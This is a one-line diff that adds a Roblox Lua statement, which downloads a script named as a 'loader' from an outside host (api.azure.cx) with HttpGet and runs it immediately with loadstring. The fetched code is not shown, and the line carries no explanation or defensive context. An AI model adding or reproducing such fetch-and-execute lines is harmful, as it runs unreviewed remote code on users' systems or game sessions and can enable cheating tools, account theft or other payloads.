@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.azure.cx/files/v3/loaders/04346a79a02aca696afb5a08d6444515.lua"))()
